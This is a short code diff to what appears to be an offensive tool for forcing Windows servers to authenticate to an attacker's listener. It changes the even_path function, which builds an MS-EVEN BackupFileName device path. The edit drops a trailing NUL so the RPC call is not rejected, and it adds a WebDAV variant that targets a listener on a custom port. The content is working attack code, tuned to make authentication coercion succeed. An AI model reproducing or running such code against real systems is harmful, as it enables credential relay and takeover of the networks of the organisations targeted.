@@ -46,8 +46,13 @@ def dfsnm_dfs_path(listener, listener_port=445):
 
 
 def even_path(listener, listener_port=445):
-    """MS-EVEN device path. SMB only — no WebDAV variant."""
-    return f"\\??\\UNC\\{listener}\\{_rnd()}\\aa{_NUL}"
+    """MS-EVEN BackupFileName. No trailing NUL: this field is an RPC_UNICODE_STRING
+    (length-prefixed), not a WSTR, an embedded NUL makes the server reject the call
+    with rpc_x_bad_stub_data before it even looks at the path. WebDAV when port != 445,
+    untested syntax, nobody has tried a WebDAV @port host inside this device-path form before."""
+    if listener_port != 445:
+        return f"\\??\\UNC\\{listener}@{listener_port}\\{_rnd(3)}"
+    return f"\\??\\UNC\\{listener}\\{_rnd()}\\aa"
 
 
 def wsp_uri(listener):
